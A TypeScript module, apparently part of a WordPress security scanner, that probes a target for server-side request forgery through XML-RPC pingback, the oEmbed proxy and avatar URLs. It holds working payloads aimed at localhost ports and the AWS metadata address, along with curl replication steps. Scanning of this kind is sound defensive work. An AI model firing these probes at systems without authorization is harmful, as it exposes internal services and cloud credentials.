import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget} from '../utils.js';

const MODULE_NAME = 'SSRF Detection';

async function xmlrpcPingbackSSRF(base: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  const targets: [string, string][] = [
    ['http://127.0.0.1/',       'localhost'],
    ['http://127.0.0.1:22/',    'localhost SSH port'],
    ['http://127.0.0.1:3306/',  'localhost MySQL port'],
    ['http://169.254.169.254/', 'AWS metadata service'],
    ['http://192.168.1.1/',     'common router IP'],
  ];

  for (const [ssrfUrl, label] of targets) {
    const payload =
      '<?xml version="1.0"?>' +
      '<methodCall><methodName>pingback.ping</methodName>' +
      `<params><param><value><string>${ssrfUrl}</string></value></param>` +
      `<param><value><string>${base}/</string></value></param>` +
      '</params></methodCall>';

    const res = await fetchURL(`${base}/xmlrpc.php`, {
      method: 'POST',
      body: payload,
      headers: { 'Content-Type': 'text/xml' },
      timeoutMs: 8000,
    });
    if (!res) continue;

    let text = '';
    try { text = await res.text(); } catch { continue; }

    // faultCode 16 = source URL does not exist (server DID try to reach it)
    // faultCode 0 = success indicator
    if (
      (text.includes('<faultCode><value><int>16</int>') ||
       text.includes('<faultCode><value><int>0</int>') ||
       text.toLowerCase().includes('pingback')) &&
      text.includes('<faultCode>') &&
      !text.includes('<int>17</int>')
    ) {
      findings.push(finding(
        'SSRF_VIA_XMLRPC_PINGBACK', 'HIGH', `${base}/xmlrpc.php`,
        `SSRF via xmlrpc pingback.ping targeting ${label} — server made outbound request`,
        {
          replication_steps: [
            `curl -s -X POST "${base}/xmlrpc.php" -H 'Content-Type: text/xml' \\`,
            `  -d '<methodCall><methodName>pingback.ping</methodName><params>` +
              `<param><value><string>${ssrfUrl}</string></value></param>` +
              `<param><value><string>${base}/</string></value></param></params></methodCall>'`,
            'Observe: faultCode 16 or attempt indicator in response.',
            'Replace target with http://169.254.169.254/latest/meta-data/ for AWS metadata.',
            'Use Burp Collaborator for out-of-band SSRF confirmation.',
          ],
          evidence: JSON.stringify({ ssrf_target: ssrfUrl }),
          remediation: 'Validate and sanitize all URL inputs. Block requests to internal/private IP ranges.',
        },
      ));
      break; // one finding per mechanism is enough
    }
  }
  return findings;
}

async function oEmbedSSRF(base: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  const targets = ['http://127.0.0.1/', 'http://localhost:22/'];

  for (const ssrfUrl of targets) {
    const url = `${base}/wp-json/oembed/1.0/proxy?url=${encodeURIComponent(ssrfUrl)}`;
    const res = await fetchURL(url, { timeoutMs: 8000 });
    if (!res) continue;

    if (res.status === 200) {
      try {
        const data = await res.json() as Record<string, unknown>;
        if (typeof data === 'object' && data !== null && ('html' in data || 'title' in data)) {
          findings.push(finding(
            'SSRF_VIA_OEMBED_PROXY', 'HIGH', url,
            'SSRF via oEmbed proxy — server fetched internal URL and returned content',
            {
              replication_steps: [
                `curl -s "${url}"`,
                'Observe: server-fetched content from internal URL in JSON response.',
                'Replace URL with http://169.254.169.254/latest/meta-data/ for cloud metadata.',
                'Reference: CVE-2020-11738 (WordPress oEmbed SSRF)',
              ],
              evidence: JSON.stringify({ ssrf_target: ssrfUrl }),
              remediation: 'Validate and sanitize all URL inputs. Block requests to internal/private IP ranges.',
            },
          ));
        }
      } catch { /* not valid JSON */ }
    }
  }
  return findings;
}

async function avatarUrlSSRF(base: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  const probe = `${base}/wp-json/wp/v2/users/1?_fields=avatar_urls`;
  const res = await fetchURL(probe);
  if (res) {
    let text = '';
    try { text = await res.text(); } catch { return findings; }
    if (text.toLowerCase().includes('gravatar')) {
      findings.push(finding(
        'AVATAR_URL_FETCH_SSRF_POSSIBLE', 'LOW', probe,
        'Server fetches user avatar URLs — may be abused for SSRF via crafted Gravatar email',
        {
          replication_steps: [
            `curl -s "${probe}"`,
            'Observe: avatar_urls field with remote Gravatar URLs.',
            'Register an account with email that maps to an internal IP Gravatar hash.',
            'Monitor server-side requests (access logs) for outbound fetches to internal IPs.',
          ],
        },
      ));
    }
  }
  return findings;
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    const [r1, r2, r3] = await Promise.allSettled([
      xmlrpcPingbackSSRF(target),
      oEmbedSSRF(target),
      avatarUrlSSRF(target),
    ]);
    if (r1.status === 'fulfilled') for (const found of r1.value) findings.push(found);
    if (r2.status === 'fulfilled') for (const found of r2.value) findings.push(found);
    if (r3.status === 'fulfilled') for (const found of r3.value) findings.push(found);
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
